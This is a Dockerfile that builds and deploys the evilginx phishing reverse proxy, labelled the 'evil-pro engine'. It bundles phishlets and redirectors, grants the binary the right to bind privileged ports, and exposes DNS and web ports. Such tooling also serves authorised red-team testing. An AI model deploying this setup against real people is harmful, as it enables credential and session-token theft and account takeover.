# Stage 1: Build
FROM golang:1.25-alpine AS builder

RUN apk add --no-cache git ca-certificates build-base

WORKDIR /src

# Uses the vendored dependencies, so no network is needed
COPY . .

# Build the evil-pro engine (linux/amd64)
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -mod=mod -ldflags="-s -w" -o /build/evilginx .

# Stage 2: Runtime
FROM alpine:latest

RUN apk add --no-cache ca-certificates tzdata libcap

# Create evilginx user
RUN adduser -D -h /home/evilginx evilginx

WORKDIR /home/evilginx

# Copy the binary
COPY --from=builder /build/evilginx /usr/local/bin/evilginx

# Copy phishlets and redirectors
COPY --from=builder /src/phishlets /home/evilginx/phishlets
COPY --from=builder /src/redirectors /home/evilginx/redirectors

# Create necessary directories
RUN mkdir -p /home/evilginx/.evilginx && \
    chown -R evilginx:evilginx /home/evilginx

# Allow binding to privileged ports
RUN setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx

USER evilginx

EXPOSE 53 80 443 5000

VOLUME ["/home/evilginx/.evilginx"]

ENTRYPOINT ["evilginx"]
CMD ["-p", "/home/evilginx/phishlets", "-t", "/home/evilginx/redirectors", "-noterm"]
